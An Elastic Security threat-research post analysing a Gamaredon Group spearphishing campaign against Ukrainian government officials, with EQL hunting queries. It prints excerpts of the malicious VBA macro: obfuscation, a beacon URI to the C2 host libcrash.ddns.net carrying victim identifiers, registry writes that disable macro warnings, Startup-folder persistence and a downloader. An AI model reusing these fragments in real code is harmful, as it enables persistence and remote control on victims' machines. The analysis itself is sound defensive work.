This post will review these details and provide detection strategies.\"\nauthor:\n  - slug: daniel-stepanic\n  - slug: andrew-pease\n  - slug: seth-goodwin\n  - slug: elastic-security-intelligence-analytics-team\nimage: \"blog-thumb-digital-shield.jpg\"\ncategory:\n  - slug: activity-group\n---\n\nFor several months, the Intelligence & Analytics team at Elastic Security has tracked an ongoing adversary campaign appearing to target Ukranian government officials. Based on our monitoring, we believe [Gamaredon Group](https://attack.mitre.org/groups/G0047/), a suspected Russia-based threat group, is behind this campaign. Our observations suggest a significant overlap between tactics, techniques, and procedures (TTPs) included within this campaign and [public reporting](https://www.anomali.com/resources/whitepapers/malicious-activity-aligning-with-gamaredon-ttps-targets-ukraine)<sup>1</sup>.\n\nThis campaign has produced and deployed updated lures on a near-daily basis that appear to target multiple Ukrainian government departments. With this high operational tempo and aggressive targeting, they consistently employ a cluster of initial access techniques and procedures. Over the past four months, these techniques have consisted of spearphishing, remote document template injection, startup folder persistence, VBA/VBScript languages, and Dynamic DNS command & control infrastructure.\n\nIn this post, we’ll walk through the campaign details, reviewing the implementation while also providing solutions such as detection strategies through the use of Elastic’s [Event Query Language (EQL)](https://www.elastic.co/blog/introducing-event-query-language).\n\n## Campaign Details\n\nThe earliest identified [infrastructure](https://www.virustotal.com/gui/domain/libre-templates.ddns.net/details) indicates this campaign has been active since August 2019. The first [sample](https://www.virustotal.com/gui/file/481eee236eadf6c947857820d3af5a397caeb8c45791f0bbdd8a21f080786e75/details) leveraging this domain was submitted to VirusTotal in early September 2019. Spearphishing emails like the example in Figure 1 (below) were used to deliver a malicious attachment and demonstrate Gamaredon Group’s attempt to impersonate an anti-corruption activist. This example targeted the National Security and Defense Council of Ukraine and dates to January 17, 2020.\n\n![](/assets/images/playing-defense-against-gamaredon-group/email_redact1.png)\n\n_Figure 1 - Spearphishing email sent to National Security and Defense Council of Ukraine_\n\nA typical lure document might masquerade as an information request to the Ministry of Foreign Affairs of Ukraine. These manufactured lures included official logos stolen from governmental offices of Ukraine and impersonated diplomats known to their targets.\n\n![](/assets/images/playing-defense-against-gamaredon-group/lure1.png)\n\n_Figure 2 - Lure document - Ministry of Foreign Affairs in Ukraine request_\n\nTo improve their chances of success, they customize the request around the same date of the campaign and include urgent requests for action. These efforts are indicative of necessity.\n\n![](/assets/images/playing-defense-against-gamaredon-group/lure2.jpg)\n\n_Figure 3 - Lure document - Information request related to NSDC Head of Ukraine_\n\nOften, the call to action first required the victim to open an attached lure document. A user who attempted to open one of these malicious attachments would see a perfectly convincing decoy document, while a sequence of invisible actions occurred behind the screen. These documents end up leveraging a technique known as [template injection](https://attack.mitre.org/techniques/T1221/), a method of loading remotely hosted Microsoft Word document templates.\n\nMicrosoft Word objects function similarly to compressed archives and have properties defined using Microsoft’s Open Office XML (OOXML) format. Within the decompressed word/\\_rels/ subdirectory, the file settings.xml.rels contained a network location where a remotely hosted template was retrieved as depicted in Figure 4.\n\n![](/assets/images/playing-defense-against-gamaredon-group/template1.jpg)\n\n_Figure 4 - Excerpt from Settings.xml.rels_\n\nEach external URL within these lures were configured to point to Dynamic DNS providers (ddns.net, hopto.org). Dynamic DNS provides automation around updating a name server in the Domain Name System (DNS). By adopting this technique, this shows the adversary’s attempt to mask their ownership and obscure atomic indicator associations through the use of transient infrastructures, such as Dynamic DNS.\n\n![](/assets/images/playing-defense-against-gamaredon-group/template_download.jpg)\n\n_Figure 5 - Word startup screen showing download of remote document template_\n\nThe remote templates are macro-enabled, configured to execute VBA macro code that persists a VBScript object in the victim’s startup folder as a foothold. We assess the objective of this initial code is used to identify the victim and to protect the second-stage payload that is intended only for their targeted victims. In the next sections, we will review the document’s metadata and macro code found in a recent [sample](https://www.virustotal.com/gui/file/feb0596e9735e03ae929d9b5ee862da19e16e5cdf57dd2a795205e591a55940f/details).\n\n## Document metadata analysis\n\nIn malicious campaigns, infrastructure is commonly created for specific targets. This serves multiple purposes, but frequently it’s done to track implants and frustrate automated research and analysis. As analysts, this gives us some insight into the adversaries’ maturity, experience, and resources. As an example, an adversary who reuses lure documents or templates may be less experienced, not interested in high-value targets, or using monetized infrastructure from previous campaigns.\n\nAnalyzing the metadata from the lure document and template allows us to see when these weaponized documents were created, as well as identify any associations between different elements of the campaign.\n\nAs we can see in Figure 6, the lure document was created on December 24, 2019 by the Author “ШУРИК”. In Figure 7, we can see that the Author is the same as observed in the lure document (ШУРИК). Additionally, we can see that the remote template was created on December 12, 2019 and then modified on December 24, 2019. There were 5 modifications to it, indicating that it has been used for 5 campaigns in 12 days — or about 2.5 days per campaign. With moderate confidence, this tells us that the remote template is likely reused and updated with new macros for new campaigns, and that they were created by the same Author (or at a minimum, the same instance of Microsoft Word).\n\nAs an analyst note, we see different tool markings that indicate this was created by a Russian speaker (Russian Author, Russian Language Code, Cyrillic character set, and the usage of Reanimator Extreme Edition). While we can use those as information to help inform overall analysis, this information can be seeded — so it doesn’t prove anything definitively on its own. In this case, this aligns with other open source analysis linking this to the Gamaredon Group, which is believed to be Russian in origin.\n\n|                        |                                                                         |\n| ---------------------- | ----------------------------------------------------------------------- |\n| File Size              | 46 kB                                                                   |\n| File Type Extension    | docx                                                                    |\n| MIME Type              | application/vnd.openxmlformats-officedocument.wordprocessingml.document |\n| Last Modified By       | ШУРИК                                                                   |\n| Revision Number        | 2                                                                       |\n| Create Date            | 2019:12:24 15:58:00Z                                                    |\n| Modify Date            | 2019:12:24 16:10:00Z                                                    |\n| Template               | pos.dot                                                                 |\n| Total Edit Time        | 2 minutes                                                               |\n| Pages                  | 1                                                                       |\n| Words                  | 195                                                                     |\n| Characters             | 1114                                                                    |\n| Application            | Microsoft Office Word                                                   |\n| Lines                  | 9                                                                       |\n| Paragraphs             | 2                                                                       |\n| Company                | Reanimator Extreme Edition                                              |\n| Characters With Spaces | 1307                                                                    |\n\n_Figure 6 - Metadata from the lure document (truncated for length)_\n\n|                        |                            |\n| ---------------------- | -------------------------- |\n| File Size              | 44 kB                      |\n| File Type Extension    | doc                        |\n| MIME Type              | application/msword         |\n| Language Code          | Russian                    |\n| Author                 | ШУРИК                      |\n| Template               | pos.dot                    |\n| Last Modified By       | ШУРИК                      |\n| Software               | Microsoft Office Word      |\n| Create Date            | 2019:12:12 11:48:00        |\n| Modify Date            | 2019:12:24 10:30:00        |\n| Code Page              | Windows Cyrillic           |\n| Company                | Reanimator Extreme Edition |\n| Char Count With Spaces | 0                          |\n| Revision Number        | 5                          |\n| Total Edit Time        | 0                          |\n| Words                  | 0                          |\n| Characters             | 0                          |\n| Pages                  | 1                          |\n| Paragraphs             | 1                          |\n| Lines                  | 1                          |\n\n_Figure 7 - Metadata from the remote template (truncated for length)_\n\nWhile we cannot state with any authority, searching for the Author “ШУРИК” has identified similar TTPs (lure documents with remote template injection) as far back as September of 2019.\n\n## Macro code analysis\n\nThe macro code was obfuscated using string concatenation and procedurally generated variables — techniques that are often used to bypass static detection technologies. Upon execution, this code provides reverse shell functionality that allows an adversary access to the victim’s system and capability to access shared resources on their local network. Figure 8 contains an excerpt of the macro that depicts the creation of a reverse shell and some of the system information collected automatically.\n\n```\nDim NoARzTHy\nNoARzTHy = \"Set WShell=CreateObject(\"\"WSc\" + \"ri\" + \"pt.S\" + \"hel\" + \"l\"\")\"\nSet PWFJWatF = CreateObject(\"WScr\" + \"ipt.Ne\" + \"two\" + \"rk\")\nDim pbuvwTLK, JzESywut\nSet GGZucIZE = CreateObject(\"Sc\" + \"rip\" + \"ting.Fi\" + \"leSy\" + \"stemOb\" + \"ject\")\npbuvwTLK = GGZucIZE.Drives(Environ(\"Syst\" + \"emDri\" + \"ve\")).SerialNumber\nOYTgBXAP = PWFJWatF.ComputerName\n```\n\n_Figure 8 - First 7 lines of macro code from the loaded document template_\n\nFigure 9 shows an excerpt of the same code removing the concatenation.\n\n```\nDim NoARzTHy\nNoARzTHy = \"Set WShell=CreateObject(\"WScript.Shell\")\"\nSet PWFJWatF = CreateObject(\"WScript.Network\")\nDim pbuvwTLK, JzESywut\nSet GGZucIZE = CreateObject(\"Scripting.FileSystemObject\")\npbuvwTLK = GGZucIZE.Drives(Environ(\"SystemDrive\")).SerialNumber\nOYTgBXAP = PWFJWatF.ComputerName\n```\n\n_Figure 9 - First 7 lines of macro code - Removal of concatenation_\n\nThe serial number and hostname of the victim's computer are some of the first pieces of information the VBA collects. They are converted to hexadecimal and included in the reverse shell HTTP request to identify both the implant and the victim. Figure 10 shows off the configuration of the URI request within the macro and Figure 11 represents an example URI.\n\n```\nJzESywut = \"h\" + \"tt\" + \"p:\" + \"//l\" + \"ibcr\" + \"ash.dd\" + \"ns.ne\" + \"t/\" & OYTgBXAP & \"_\" & HFzesifc & \"//po\" + \"sol\" + \"re\" + \"boo\" + \"t.ph\" + \"p\"\n```\n\n_Figure 10 - URI request configuration - Macro_\n\n```\nJzESywut = hxxp://libcrash.ddns[.]net/ENDPOINT1_96L02G3D//posolreboot.php\n```\n\n_Figure 11 - URI request configuration - Example_\n\nBy default, Microsoft disables external or untrusted macros by setting key values in the registry at HKCU\\Software\\Microsoft\\Office\\(VERSION)\\Word\\Security\\. The first registry modification made by this macro changes the key value of AccessVBOM to 1, effectively bypassing the default setting to enable external or untrusted macros. The second registry modification enables all macros automatically and disables warnings for future macro-enabled objects. Figure 12 represents the macro code for these registry modifications.\n\n```\nFEDzCjgi$ = \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\" & Application.Version & _\"\\Word\\Security\\\"\nCreateObject(\"WScript.Shell\").RegWrite FEDzCjgi$ & \"AccessVBOM\", 1, \"REG_DWORD\"\nCreateObject(\"WScript.Shell\").RegWrite FEDzCjgi$ & \"VBAWarnings\", 1, \"REG_DWORD\"\n```\n\n_Figure 12 - Registry modifications found in macro_\n\nThe remaining lines of code end up writing a VBScript file and placing it in the user’s startup directory. Figure 13 contains an excerpt of the beginning lines of macro code where the VBScript (security.vbs) is written to disk and placed in the startup folder.\n\n```\nDim LISPVdZd As Object\nSet LISPVdZd = GGZucIZE.CreateTextFile(FESHWDaD + \"\\Mi\" + \"croso\" + \"ft\\Wi\" + \"ndow\" + \"s\\St\" + \"art Men\" + \"u\\Pro\" + \"grams\\Sta\" + \"rtup\\secur\" + \"ity.v\" + \"b\" + \"s\", True, True)\n```\n\n_Figure 13 - Macro code writing VBScript file (security.vbs)_\n\nUpon rebooting or successfully authenticating to an infected system, the persistent VBScript file is automatically executed and a standard HTTP GET is made with the previously observed URI (Figure 14). If the request is successful, the response body gets stored into another variable. This functionality appears to serve as a downloader that has specific subroutine instructions for reassembling a binary on disk. Figure 14 contains an excerpt of the function used to construct the HTTP GET request.\n\n```\nFunction TOGeMFBD(iWotBBKf)\nOn Error Resume Next\nSet EXJJrRlN = CreateObject(\"MSXML2.XMLHTTP\")\nWith EXJJrRlN\n.Open \"GET\", iWotBBKf, False\n.send\nEnd With\nIf EXJJrRlN.Status = 200 Then\nTOGeMFBD = EXJJrRlN.ResponseBody\nEnd If\nEnd Function\n```\n\n_Figure 14 - GET request (security.vbs)_\n\nDuring dynamic analysis, analysts identified that the script enters a loop while sending the request. A 0-byte file is created under the infected user’s roaming profile with a procedurally generated file name and text file extension. The file is iteratively written and deleted without the contents changing.\n\nAnalysts have not confirmed the purpose of this file, and suspect it is used to reassemble a segmented later-stage implant. Potential reasons to obfuscate this process include evading detection and response solutions.\n\n## Pteranodon update\n\nWhile doing this research, we observed samples and artifacts that appear to be related to an updated version of the Gamaredon Group’s custom backdoor, known as [Pteranodon](https://attack.mitre.org/software/S0147/). Although we don’t have substantial evidence that Pteranodon is the final payload victims are infected with during this campaign, we assess with moderate confidence that this activity is linked to Gamaredon Group.\n\nThree PE samples were uploaded to VirusTotal last month with each dropping two text files ([ExcelMyMacros.vba](https://www.virustotal.com/gui/file/c4089686965df5e52105b6eac06703aa11c4891695278446370f623d531b505e/details), [wordMacros.vba](https://www.virustotal.com/gui/file/02e6e2bfaaf6e77cfaccadaf26167135c53cf2c934d17c5a83e5bbcadd85b47d/details)). The two text files share several similarities to the VBA macro code found in the remote templates used in this campaign — specifically, the methods of retrieving and hex-encoding the serial number and similar subroutine logic. Figure 15 depicts the VBA macro code from the remote template on the left and the dropped VBA macro code from a known Pteranodon implant on the right.\n\n**VBA from Campaign**\n\n```\nFor LfJesrvH = 0 To UBound( IvAPFGDD )\" + vbCrLf\nLISPVdZd.Write \"IvAPFGDD(LfJesrvH) = Asc( Mid( EaCJFwPc, LfJesrvH + 1, 1 ) )\" + vbCrLf\nLISPVdZd.Write \"Next\" + vbCrLf\nLISPVdZd.Write \"GetFEDzCjgi = IvAPFGDD\" + vbCrLf\n```\n\n**VBA from Pteranodon**\n\n```\nFor i = 0 To UBound( asrrCodes )\" + vbCrLf\nNewVDJKpCBSFile.Write \" asrrCodes(i) = Asc( Mid( myPassPhrase, i + 1, 1 ) )\" + vbCrLf\nNewVDJKpCBSFile.Write \" Next\" + vbCrLf\nNewVDJKpCBSFile.Write \" GetKey = asrrCodes\" + vbCrLf\n```\n\n_Figure 15 - Macro comparison - VBA from Campaign (top) vs VBA from Pteranodon (bottom)_\n\nBoth text files contained VBA, and had the same functionality for disabling macro warnings, creating a persistent VBScript in the startup folder and establishing connections to C2. What’s interesting with the dropped text files (VBA), is that they show the true variable names used by the developers before their tooling obfuscates the variables. At the time of this writing, each of the four C2 servers (see attached indicators) affiliated with Pteranodon samples were currently active and hosted a network allocated to ASN9123 (TIMEWEB LTD). Macro code associated with the Gamaredon Group campaign targeting Ukraninan officials called back to C2 hosted in the same network.\n\nAn interesting change in some of these artifacts appears to be the adoption of .NET. Along with the two text files containing VBA code, there are three dropped DLL’s (Microsoft.Office.Interop.Excel.dll, Microsoft.Office.Interop.Word.dll, Microsoft.Vbe.Interop.dll) and a .NET [sample](https://www.virustotal.com/gui/file/145a61a14ec6d32b105a6279cd943317b41f1d27f21ac64df61bcdd464868edd/details) showing dependencies with these files. Figure 16 shows a hex-encoded reference to one of the VBA files (wordMacros.txt). Based on these observations, it’s intriguing to see Gamaredon Group continue to leverage core functionality of their VBA stager code, but in a new method of execution by using .NET\n\n![](/assets/images/playing-defense-against-gamaredon-group/dotnet_reference.jpg)\n\n_Figure 16 - .NET reference to “wordMacros.txt”_\n\n## Detection crafting\n\nFor organizations interested in detecting TTPs discussed in this blog post, detection logic has been provided for the following categories:\n\n### Dynamic DNS\n\n[Dynamic DNS](https://attack.mitre.org/techniques/T1311/) enables adversaries to rapidly provision very large numbers of records that map back to their infrastructure, creating a confusion layer between victims and adversaries. Gamaredon Group exclusively used Dynamic DNS locations for remotely hosted templates, rotating domains consistently, and leveraging separate infrastructure for hosting stagers and templates.\n\nProfiling Dynamic DNS for your enterprise is an amazing way to get started hunting — not just to baseline and build environmental awareness, but also to outright find evil. We will primarily focus on the two Dynamic DNS providers observed in relation to this campaign. If you need inspiration, consider counting up all non-browser processes that made a DNS request to one of these Dynamic DNS providers as shown in Figure 17.\n\n```\ndns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\") and\nprocess_name not in (\"chrome.exe\",\"iexplore.exe\", \"firefox.exe\")\n| count process_name, query_name\n```\n\n_Figure 17 - EQL Query - Count of non-browser process to dynamic DNS providers_\n\nAnother option examines the processes that most frequently communicate with these providers, and may provide more context regarding how dynamic DNS is used in your environment, or enable an analyst to find signs of other malicious activity.\n\n```\nnetwork where event of\n[dns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\")\n| count process_name, total_in_bytes, total_out_bytes\n```\n\n_Figure 18 - EQL query - Network traffic of processes to dynamic DNS providers_\n\n### Template Injection\n\nSpearphishing attachments that utilize [template injection](https://attack.mitre.org/techniques/T1221/) may bypass security controls because they contain no embedded VBA code. The attached document retrieves a remotely hosted template where the malicious VBA code resides. In order to detect this activity dynamically, analyze DNS and network traffic over common protocols (HTTP/HTTPS/SMB) and processes generated by Microsoft Office applications. Enterprise defenders may need to whitelist any legitimate use of remotely hosted templates, or any benign network activity to Microsoft infrastructure. Below is an example EQL query focused on new process creation events from Office products that also made DNS requests outside our whitelist.\n\n```\nsequence by unique_pid\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n[dns where not wildcard(query_name , \"*.microsoft.com\", \"*.skype.com\")]\n```\n\n_Figure 19 - EQL query - DNS traffic from Office applications_\n\nSome enhancements we can use with the previous query is to add a network event to the sequence as well as look for a spawned child process bringing in more context to the detection.\n\n```\nsequence\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")] by unique_pid\n[dns where not wildcard(query_name, \"*.microsoft.com\", \"*.skype.com\")] by unique_pid\n[network where true] by unique_pid\n[process where subtype.create] by unique_ppid\n```\n\n_Figure 20 - EQL query - Network traffic making dynamic DNS requests from Office applications_\n\nIf we wanted to tailor a sequence-based detection to the Gamaredon Group activity specifically, we can bring in the previous Dynamic DNS providers, which creates a more restrictive filter.\n\n```\nsequence by unique_pid\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n[network where event of\n[dns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\")]]\n```\n\n_Figure 21 - EQL query - Network traffic making dynamic DNS requests from Office applications_\n\nAcross a range of features provided by the Elastic Endpoint, this attack is prevented through different machine-learning technologies to stop advanced threats such as macro-enabled documents and malicious binaries. Along with these protections, we can take nearly any EQL logic and deploy it in prevention mode to completely stop an attack such as in this example with the download and execution of the remote template. Here’s a short clip in action:\n\n<Video vidyard_uuid=\"Ex2QdtBA8eaHYQFDMK8wWR\" />\n\n### Malicious registry configuration\n\nIn order for adversaries to be effective in their mission, they often create their own opportunities. In this case, the adversary reconfigured the target endpoint in order to disable macro security warnings and trust future macros automatically. These small changes can end up having larger implications, and defenders can look for them as symptoms of more serious security issues. For example, these same techniques have also been associated with threat groups like APT32 and are leveraged by malware families such as [AgentTesla](https://www.fortinet.com/blog/threat-research/in-depth-analysis-of-net-malware-javaupdtr.html) and [BabyShark](https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/).\n\nThis query looks for evidence of the registry modifications that disable warnings for macros and automatically enabling future macros:\n\n```\nregistry where registry_data == 1 and wildcard(registry_path,\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\AccessVBOM\",\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\VBAWarnings\")\n```\n\n_Figure 22 - EQL query - Registry modifications around disabling macro security features_\n\nThat would function perfectly well as a standalone detection, but EQL allows us to look for both the registry modification and template injection techniques in this example query:\n\n```\nsequence by unique_pid\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n[registry where registry_data == 1 and wildcard(registry_path,\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\AccessVBOM\",\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\VBAWarnings\")]\n[registry where registry_data == 1 and wildcard(registry_path,\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\AccessVBOM\",\n\"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\VBAWarnings\")]\n```\n\n_Figure 23 - EQL query - Registry modifications around disabling macro security features_\n\n### Persistence startup\n\nGamaredon Group leveraged both malicious Windows shortcut files and script objects written to the [Startup folder](https://attack.mitre.org/techniques/T1060/) for persistence. This technique is very effective in spite of its simplicity and continues to be popular among adversaries. One of the first places to start building detection logic would be to inquire about processes that write files to the startup folder.\n\n```\nfile where subtype.create\nand (\nfile_path == \"*\\\\Programs\\\\Startup\\\\*.lnk\" or\nfile_path == \"*\\\\Programs\\\\Startup\\\\*.vbs\"\n)\n| count process_name, file_path, user_name\n```\n\n_Figure 24 - EQL query - Monitoring file writes to startup folder_\n\nTo take it a bit further, we can also customize detection logic to include the VBScript execution at logon. This is a great example for building a sequenced-based signal, as we will track the adversary’s activity over an extended period of time — such as 90 days. Once the machine is rebooted or the user logs back in, an alert can be generated when WScript executes the VBScript file at startup.\n\n```\nsequence with maxspan=90d\n[file where subtype.create and file_path == \"*\\\\Programs\\\\Startup\\\\*.vbs\"]\n[process where subtype.create and parent_process_name==\"explorer.exe\" and\nprocess_name == “wscript.exe” and command_line == \"*\\\\Programs\\\\Startup\\\\*\"]\n```\n\n_Figure 25 - EQL query - Monitoring execution of startup processes_\n\n## Conclusion\n\nIn this post, we reviewed recent campaign TTPs tied to an adversary known publicly as Gamaredon Group. This group is likely to have been active since at least 2013 and has engaged in an ongoing campaign against Ukraine at the time of this writing. We highlighted some of their current techniques such as template injection and the use of Dynamic DNS providers, the macro code found in a recent sample, and updates to their custom backdoor known as Pteranodon. By using [EQL](https://www.elastic.co/blog/introducing-event-query-language), we also shared hunting and detection strategies around four specific techniques used by Gamaredon Group.\n\nWe hope that by sharing some of these insights and queries, we can help raise awareness and continue to focus on protecting the world's data from attacks. To enable organizations further, we’ve added all the Indicators of Compromise (IOCs) below and added the queries in this post into the [EQLLib repository](https://eqllib.readthedocs.io/en/latest/analytics.html).\n\nInterested in using Elastic Security?
